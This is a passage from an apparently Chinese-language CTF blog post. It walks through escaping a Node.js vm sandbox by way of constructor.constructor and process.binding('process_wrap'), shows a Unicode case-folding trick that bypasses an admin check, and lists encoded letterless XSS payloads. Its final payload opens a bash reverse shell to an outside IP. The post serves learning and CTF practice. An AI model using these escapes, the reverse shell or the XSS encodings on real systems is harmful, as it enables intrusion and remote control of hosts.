<span class="built_in">require</span>(<span class="string">'readline'</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* remove mainModule for better security */</span></span><br><span class="line">process.mainModule = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cloakObject</span>(<span class="params">obj, allowed_properties=[]</span>)</span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Prevent access to properties defined before the cloaking</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">let</span> _newProps = <span class="keyword">new</span> <span class="built_in">Set</span>(allowed_properties);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Proxy</span>(obj, &#123;</span><br><span class="line">        <span class="keyword">get</span>: (obj, prop) =&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> _newProps.has(prop) ? obj[prop] : <span class="literal">undefined</span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="keyword">set</span>: (obj, prop, value) =&gt; &#123;</span><br><span class="line">            _newProps.add(prop);</span><br><span class="line">            obj[prop] = value;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evalInJail</span>(<span class="params">env, options</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> context = vm.createContext(env);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">script</span>)</span>&#123;</span><br><span class="line">        <span class="comment">/* "use strict" to prevent any callee/caller trickery */</span></span><br><span class="line">        <span class="keyword">const</span> src = <span class="string">`"use strict";\n<span class="subst">$&#123;script&#125;</span>`</span>;</span><br><span class="line">        vm.createScript(src).runInNewContext(context, options);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startPrompt</span>(<span class="params">handler, ignoreEmptyLines=false</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> rl = readline.createInterface(&#123;</span><br><span class="line">        input: process.stdin,</span><br><span class="line">        output: process.stdout</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    rl.on(<span class="string">'line'</span>, line =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (ignoreEmptyLines &amp;&amp; !line)&#123;</span><br><span class="line">            <span class="keyword">return</span> rl.prompt();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> handler(line) ? rl.close() : rl.prompt()</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    rl.prompt()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"   _________________________________ "</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"  |                                 |"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"  |   Welcome to our js evaluator   |"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"  | Enter your script, end with EOF |"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"  |  You can use the log() function |"</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"  |_________________________________|\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">readUntil</span>(<span class="params">endline, finish</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> buffer = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">line</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (line === endline)&#123;</span><br><span class="line">                finish(buffer);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">            buffer += <span class="string">`<span class="subst">$&#123;line&#125;</span>\n`</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Give access to cloaked version of console.log */</span></span><br><span class="line">    <span class="keyword">const</span> env = &#123;</span><br><span class="line">        log: cloakObject(<span class="built_in">console</span>.log)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> options = &#123;</span><br><span class="line">        timeout: <span class="number">3000</span></span><br><span class="line">    &#125;;</span><br><span class="line">    startPrompt(readUntil(<span class="string">"EOF"</span>, evalInJail(env, options)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br></pre></td></tr></table></figure>
+
+<h6 id="沙箱是使用Node-js-vm-module来实现的，我们只能使用其中的log-函数。"><a href="#沙箱是使用Node-js-vm-module来实现的，我们只能使用其中的log-函数。" class="headerlink" title="沙箱是使用Node.js vm module来实现的，我们只能使用其中的log()函数。"></a>沙箱是使用<a href="https://nodejs.org/api/vm.html" target="_blank" rel="noopener">Node.js <code>vm</code> module</a>来实现的，我们只能使用其中的<code>log()</code>函数。</h6><h6 id="题目解决"><a href="#题目解决" class="headerlink" title="题目解决"></a>题目解决</h6><h6 id="我们的目标是执行系统命令来获取flag。"><a href="#我们的目标是执行系统命令来获取flag。" class="headerlink" title="我们的目标是执行系统命令来获取flag。"></a>我们的目标是执行系统命令来获取flag。</h6><h6 id="第一步：虚拟机逃逸"><a href="#第一步：虚拟机逃逸" class="headerlink" title="第一步：虚拟机逃逸"></a>第一步：虚拟机逃逸</h6><h6 id="为了从虚拟机逃逸，我们将使用构造函数的构造函数来创建具有受控主体的匿名函数。"><a href="#为了从虚拟机逃逸，我们将使用构造函数的构造函数来创建具有受控主体的匿名函数。" class="headerlink" title="为了从虚拟机逃逸，我们将使用构造函数的构造函数来创建具有受控主体的匿名函数。"></a>为了从虚拟机逃逸，我们将使用构造函数的构造函数来创建具有受控主体的匿名函数。</h6><h6 id="例如-使用chrome-console-："><a href="#例如-使用chrome-console-：" class="headerlink" title="例如(使用chrome console)："></a>例如(使用chrome console)：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; this.constructor.constructor(&quot;alert(1)&quot;);</span><br><span class="line">ƒ anonymous(</span><br><span class="line">) &#123;</span><br><span class="line">alert(1)</span><br><span class="line">&#125;</span><br><span class="line">&gt; this.constructor.constructor(&quot;alert(1)&quot;).toString();</span><br><span class="line">&quot;function anonymous(</span><br><span class="line">) &#123;</span><br><span class="line">alert(1)</span><br><span class="line">&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<h6 id="使用这种技术，我们可以在vm上下文之外执行代码。实际上，this通过调用返回的对象constructor不限于log函数："><a href="#使用这种技术，我们可以在vm上下文之外执行代码。实际上，this通过调用返回的对象constructor不限于log函数：" class="headerlink" title="使用这种技术，我们可以在vm上下文之外执行代码。实际上，this通过调用返回的对象constructor不限于log函数："></a>使用这种技术，我们可以在vm上下文之外执行代码。实际上，<code>this</code>通过调用返回的对象<code>constructor</code>不限于log函数：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt; log(this.constructor.constructor(&apos;return this&apos;)());</span><br><span class="line">&gt; EOF</span><br><span class="line">[Function: anonymous]</span><br><span class="line">Object [global] &#123;</span><br><span class="line">  global: [Circular],</span><br><span class="line">  process:</span><br><span class="line">   process &#123;</span><br><span class="line">     title: &apos;nodejs&apos;,</span><br><span class="line">     version: &apos;v10.15.2&apos;,</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">  setImmediate:</span><br><span class="line">   &#123; [Function: setImmediate] [Symbol(util.promisify.custom)]: [Function] &#125;,</span><br><span class="line">  setInterval: [Function: setInterval],</span><br><span class="line">  setTimeout:</span><br><span class="line">   &#123; [Function: setTimeout] [Symbol(util.promisify.custom)]: [Function] &#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="与vm上下文相比："><a href="#与vm上下文相比：" class="headerlink" title="与vm上下文相比："></a>与vm上下文相比：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; log(this);</span><br><span class="line">&gt; EOF</span><br><span class="line">&#123; log: [Function] &#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="第二步：执行一个shell命令"><a href="#第二步：执行一个shell命令" class="headerlink" title="第二步：执行一个shell命令"></a>第二步：执行一个shell命令</h6><h6 id="脚本的process-mainModule模块已经被清除，因此我们无法访问require函数。"><a href="#脚本的process-mainModule模块已经被清除，因此我们无法访问require函数。" class="headerlink" title="脚本的process.mainModule模块已经被清除，因此我们无法访问require函数。"></a>脚本的<code>process.mainModule</code>模块已经被清除，因此我们无法访问<code>require</code>函数。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/* remove mainModule for better security */</span><br><span class="line">process.mainModule = &#123;&#125;;</span><br></pre></td></tr></table></figure>
+
+<h6 id="但是，我们确定该binding函数在构造函数返回的对象上可用。"><a href="#但是，我们确定该binding函数在构造函数返回的对象上可用。" class="headerlink" title="但是，我们确定该binding函数在构造函数返回的对象上可用。"></a>但是，我们确定该<code>binding</code>函数在构造函数返回的对象上可用。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; log(this.proc = this.constructor.constructor(&apos;return this.process&apos;)());</span><br><span class="line"></span><br><span class="line">binding: [Function: binding]</span><br></pre></td></tr></table></figure>
+
+<h6 id="该binding功能允许加载内部模块。首先，我们尝试使用fs模块从文件中读取flag。"><a href="#该binding功能允许加载内部模块。首先，我们尝试使用fs模块从文件中读取flag。" class="headerlink" title="该binding功能允许加载内部模块。首先，我们尝试使用fs模块从文件中读取flag。"></a>该<code>binding</code>功能允许加载内部模块。首先，我们尝试使用<code>fs</code>模块从文件中读取flag。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; log(this.constructor.constructor(&apos;return this.process.binding&apos;)()(&apos;fs&apos;))</span><br></pre></td></tr></table></figure>
+
+<h6 id="Fail"><a href="#Fail" class="headerlink" title="Fail:("></a>Fail:(</h6><h6 id="但是我们能够列出目录并且标识flag的位置："><a href="#但是我们能够列出目录并且标识flag的位置：" class="headerlink" title="但是我们能够列出目录并且标识flag的位置："></a>但是我们能够列出目录并且标识flag的位置：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; log(this.constructor.constructor(&apos;return this.process.binding&apos;)()(&apos;fs&apos;).readdir(&apos;./&apos;, &#123;&#125;, &quot;&quot;,&quot;&quot;, function (err, data) &#123;data&#125;));</span><br></pre></td></tr></table></figure>
+
+<h6 id="后来题目的作者给了以下tip"><a href="#后来题目的作者给了以下tip" class="headerlink" title="后来题目的作者给了以下tip:"></a>后来题目的作者给了以下tip:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ou don’t have child_process and its exec function, so write it</span><br></pre></td></tr></table></figure>
+
+<h6 id="因此，让我们来阅读nodejs-source-code-on-Github-for-child-process"><a href="#因此，让我们来阅读nodejs-source-code-on-Github-for-child-process" class="headerlink" title="因此，让我们来阅读nodejs source code on Github for child_process:"></a>因此，让我们来阅读<a href="https://github.com/nodejs/node/blob/master/lib/internal/child_process.js" target="_blank" rel="noopener">nodejs source code on Github for child_process</a>:</h6><h6 id="chile-process模块的内部通过绑定process-wrap来调用spawn函数执行命令："><a href="#chile-process模块的内部通过绑定process-wrap来调用spawn函数执行命令：" class="headerlink" title="chile_process模块的内部通过绑定process_wrap来调用spawn函数执行命令："></a><code>chile_process</code>模块的内部通过绑定<code>process_wrap</code>来调用<code>spawn</code>函数执行命令：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; Process &#125; = internalBinding(<span class="string">'process_wrap'</span>);</span><br><span class="line"></span><br><span class="line">child.spawn(&#123;</span><br><span class="line">    file: opts.file,</span><br><span class="line">    args: opts.args,</span><br><span class="line">    cwd: options.cwd,</span><br><span class="line">    windowsHide: !!options.windowsHide,</span><br><span class="line">    windowsVerbatimArguments: !!options.windowsVerbatimArguments,</span><br><span class="line">    detached: !!options.detached,</span><br><span class="line">    envPairs: opts.envPairs,</span><br><span class="line">    stdio: options.stdio,</span><br><span class="line">    uid: options.uid,</span><br><span class="line">    gid: options.gid</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h6 id="因此我们必须创建一个Process对象并调用其spawn函数执行系统命令："><a href="#因此我们必须创建一个Process对象并调用其spawn函数执行系统命令：" class="headerlink" title="因此我们必须创建一个Process对象并调用其spawn函数执行系统命令："></a>因此我们必须创建一个<code>Process</code>对象并调用其<code>spawn</code>函数执行系统命令：</h6><h6 id="1-检查绑定是否不会失败："><a href="#1-检查绑定是否不会失败：" class="headerlink" title="1-检查绑定是否不会失败："></a>1-检查绑定是否不会失败：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; log(this.constructor.constructor(&apos;return this.process.binding&apos;)()(&apos;process_wrap&apos;));</span><br><span class="line">&gt; EOF</span><br><span class="line">&#123; Process: [Function: Process] &#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="2-实例化一个Process对象："><a href="#2-实例化一个Process对象：" class="headerlink" title="2-实例化一个Process对象："></a>2-实例化一个<code>Process</code>对象：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; log(this.proc_wrap = this.constructor.constructor(&apos;return this.process.binding&apos;)());</span><br><span class="line">&gt; log(this.Process = this.proc_wrap(&apos;process_wrap&apos;).Process);</span><br><span class="line">&gt; log(this.process = new Process());</span><br></pre></td></tr></table></figure>
+
+<h6 id="3-spawn使用良好的参数调用该函数："><a href="#3-spawn使用良好的参数调用该函数：" class="headerlink" title="3-spawn使用良好的参数调用该函数："></a>3-<code>spawn</code>使用良好的参数调用该函数：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; log(this.env = this.constructor.constructor(&apos;return this.process.env&apos;)());</span><br><span class="line">&gt; log(this.mproc  = this.constructor.constructor(&apos;return this.process&apos;)());</span><br><span class="line">&gt; log(this.sot = this.constructor.constructor(&apos;return this.process.stdout&apos;)());</span><br><span class="line">&gt; log(this.sin = this.constructor.constructor(&apos;return this.process.stdin&apos;)());</span><br><span class="line">&gt; log(this.rc = process.spawn(&#123;file:&apos;/home/guest/flag_reader&apos;,args:[],cwd:&quot;/home/guest&quot;,windowsVerbatimArguments:false,detached:false,envPairs:this.env, stdio:[mproc.stdin, mproc.stdout, mproc.stderr]&#125;));</span><br><span class="line"></span><br><span class="line">&gt; EOF</span><br><span class="line"></span><br><span class="line">breizctf_flag&#123;FORGOTTEN_FLAG&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="4-payload"><a href="#4-payload" class="headerlink" title="4-payload:"></a>4-payload:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">log(this.proc_wrap = this.constructor.constructor(&apos;return this.process.binding&apos;)());</span><br><span class="line">log(this.Process = this.proc_wrap(&apos;process_wrap&apos;).Process);</span><br><span class="line">log(this.process = new Process());</span><br><span class="line">log(this.env = this.constructor.constructor(&apos;return this.process.env&apos;)());</span><br><span class="line">log(this.mproc  = this.constructor.constructor(&apos;return this.process&apos;)());</span><br><span class="line">log(this.sot = this.constructor.constructor(&apos;return this.process.stdout&apos;)());</span><br><span class="line">log(this.sin = this.constructor.constructor(&apos;return this.process.stdin&apos;)());</span><br><span class="line">log(this.rc = process.spawn(&#123;file:&apos;bash&apos;,args:[&apos;/bin/bash&apos;,&apos;-c&apos;,&apos;bash -i &gt;&amp; /dev/tcp/123.57.232.69/5478 0&gt;&amp;1&apos;],cwd:&quot;./&quot;,windowsVerbatimArguments:false,detached:false,envPairs:this.env, stdio:[mproc.stdin, mproc.stdout, mproc.stderr]&#125;));</span><br></pre></td></tr></table></figure>
+
+<h5 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h5><h6 id="https-tipi-hack-github-io-2019-04-14-breizh-jail-calc2-html"><a href="#https-tipi-hack-github-io-2019-04-14-breizh-jail-calc2-html" class="headerlink" title="https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html"></a><a href="https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html" target="_blank" rel="noopener">https://tipi-hack.github.io/2019/04/14/breizh-jail-calc2.html</a></h6><h6 id="https-es6-ruanyifeng-com-docs-proxy"><a href="#https-es6-ruanyifeng-com-docs-proxy" class="headerlink" title="https://es6.ruanyifeng.com/#docs/proxy"></a><a href="https://es6.ruanyifeng.com/#docs/proxy" target="_blank" rel="noopener">https://es6.ruanyifeng.com/#docs/proxy</a></h6><h6 id="https-segmentfault-com-a-1190000012672620"><a href="#https-segmentfault-com-a-1190000012672620" class="headerlink" title="https://segmentfault.com/a/1190000012672620"></a><a href="https://segmentfault.com/a/1190000012672620" target="_blank" rel="noopener">https://segmentfault.com/a/1190000012672620</a></h6><h4 id="0x05-javascript大小写特性"><a href="#0x05-javascript大小写特性" class="headerlink" title="0x05 javascript大小写特性"></a>0x05 javascript大小写特性</h4><h6 id="在javascript中有几个特殊的字符需要记录一下"><a href="#在javascript中有几个特殊的字符需要记录一下" class="headerlink" title="在javascript中有几个特殊的字符需要记录一下"></a>在javascript中有几个特殊的字符需要记录一下</h6><h6 id="对于toUpperCase"><a href="#对于toUpperCase" class="headerlink" title="对于toUpperCase():"></a>对于toUpperCase():</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br></pre></td></tr></table></figure>
+
+<h6 id="对于toLowerCase"><a href="#对于toLowerCase" class="headerlink" title="对于toLowerCase():"></a>对于toLowerCase():</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是ascii的K)</span><br></pre></td></tr></table></figure>
+
+<h6 id="在绕一些规则的时候就可以利用这几个特殊字符进行绕过"><a href="#在绕一些规则的时候就可以利用这几个特殊字符进行绕过" class="headerlink" title="在绕一些规则的时候就可以利用这几个特殊字符进行绕过"></a>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</h6><h5 id="CTF题实例-Hacktm中的一道Nodejs题"><a href="#CTF题实例-Hacktm中的一道Nodejs题" class="headerlink" title="CTF题实例 - Hacktm中的一道Nodejs题"></a>CTF题实例 - Hacktm中的一道Nodejs题</h5><h6 id="部分题目源码："><a href="#部分题目源码：" class="headerlink" title="部分题目源码："></a>部分题目源码：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidUser</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    u.username.length &gt;= <span class="number">3</span> &amp;&amp;</span><br><span class="line">    u.username.toUpperCase() !== config.adminUsername.toUpperCase()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAdmin</span>(<span class="params">u</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> u.username.toLowerCase() == config.adminUsername.toLowerCase();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="解题时需要登录管理员的用户名，但是在登录时，isValidUser函数会对用户输入的用户名进行toUpperCase处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。"><a href="#解题时需要登录管理员的用户名，但是在登录时，isValidUser函数会对用户输入的用户名进行toUpperCase处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。" class="headerlink" title="解题时需要登录管理员的用户名，但是在登录时，isValidUser函数会对用户输入的用户名进行toUpperCase处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。"></a>解题时需要登录管理员的用户名，但是在登录时，<code>isValidUser</code>函数会对用户输入的用户名进行<code>toUpperCase</code>处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。</h6><h6 id="但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是toLowerCase。所以这两个差异，就可以使用大小写特性来进行绕过。"><a href="#但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是toLowerCase。所以这两个差异，就可以使用大小写特性来进行绕过。" class="headerlink" title="但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是toLowerCase。所以这两个差异，就可以使用大小写特性来进行绕过。"></a>但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是<code>toLowerCase</code>。所以这两个差异，就可以使用大小写特性来进行绕过。</h6><h6 id="题目中默认的管理员用户名为：hacktm"><a href="#题目中默认的管理员用户名为：hacktm" class="headerlink" title="题目中默认的管理员用户名为：hacktm"></a>题目中默认的管理员用户名为：hacktm</h6><h6 id="所以，我们指定登录时的用户名为：hacKtm-即可绕过isValidUser和isAdmin的验证。"><a href="#所以，我们指定登录时的用户名为：hacKtm-即可绕过isValidUser和isAdmin的验证。" class="headerlink" title="所以，我们指定登录时的用户名为：hacKtm 即可绕过isValidUser和isAdmin的验证。"></a>所以，我们指定登录时的用户名为：hacKtm 即可绕过<code>isValidUser</code>和<code>isAdmin</code>的验证。</h6><h6 id="题目完整Writeup-HackTM中一道Node-js题分析-Draw-with-us"><a href="#题目完整Writeup-HackTM中一道Node-js题分析-Draw-with-us" class="headerlink" title="题目完整Writeup:HackTM中一道Node.js题分析(Draw with us)"></a>题目完整Writeup:<a href="https://xz.aliyun.com/t/7177" target="_blank" rel="noopener">HackTM中一道Node.js题分析(Draw with us)</a></h6><h4 id="0x06-常见的xss-payload"><a href="#0x06-常见的xss-payload" class="headerlink" title="0x06 常见的xss payload"></a>0x06 常见的xss payload</h4><h5 id="1-无字母的xss-payload"><a href="#1-无字母的xss-payload" class="headerlink" title="1.无字母的xss payload:"></a>1.无字母的xss payload:</h5><h6 id="javascript中调用函数完全可以不需要存在任何字母，js中的匿名函数："><a href="#javascript中调用函数完全可以不需要存在任何字母，js中的匿名函数：" class="headerlink" title="javascript中调用函数完全可以不需要存在任何字母，js中的匿名函数："></a>javascript中调用函数完全可以不需要存在任何字母，js中的匿名函数：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//我们可以使用以下方式创建一个函数:</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"alert(1)"</span>);</span><br><span class="line"><span class="comment">//也可以不要new</span></span><br><span class="line"><span class="built_in">Function</span>(<span class="string">"alert(1)"</span>)();</span><br><span class="line"><span class="comment">//可以将Function转换下</span></span><br><span class="line"><span class="string">"..."</span>.substr.constructor(<span class="string">"alert(1)"</span>)();</span><br><span class="line"><span class="comment">//再转换下</span></span><br><span class="line"><span class="string">"..."</span>[<span class="string">"substr"</span>][<span class="string">"constructor"</span>](<span class="string">"alert(1)"</span>)();</span><br><span class="line"><span class="comment">//字符串全部转义</span></span><br><span class="line"><span class="string">"..."</span>[<span class="string">"\163\165\142\163\164\162"</span>][<span class="string">"\143\157\156\163\164\162\165\143\164\157\162"</span>](<span class="string">"\141\154\145\162\164\50\61\51"</span>)();</span><br></pre></td></tr></table></figure>
+
+<h6 id="构造的脚本："><a href="#构造的脚本：" class="headerlink" title="构造的脚本："></a>构造的脚本：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stringToHex</span>(<span class="params">str,mode=<span class="number">8</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> splitChar=[<span class="string">"\""</span>,<span class="string">"\'"</span>,<span class="string">"`"</span>,<span class="string">"["</span>,<span class="string">"]"</span>,<span class="string">";"</span>,<span class="string">"("</span>,<span class="string">")"</span>,<span class="string">"."</span>,<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,<span class="string">"8"</span>,<span class="string">"9"</span>];</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; str.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(result === <span class="string">""</span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> char=str[i];</span><br><span class="line">            <span class="keyword">if</span>(splitChar.includes(char))&#123;</span><br><span class="line">                result=char</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                result=str.charCodeAt(i).toString(mode)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> char=str[i];</span><br><span class="line">            <span class="keyword">if</span>(splitChar.includes(char))&#123;</span><br><span class="line">                result+=char</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">const</span> tmp=str.charCodeAt(i).toString(mode);</span><br><span class="line">                mode===<span class="number">8</span>?</span><br><span class="line">                    result += <span class="string">"\\"</span> + tmp:</span><br><span class="line">                    result += <span class="string">"\\x"</span> + tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(stringToHex(<span class="string">"[]['map']['constructor']('alert(1)')();"</span>,<span class="number">16</span>));</span><br></pre></td></tr></table></figure>
+
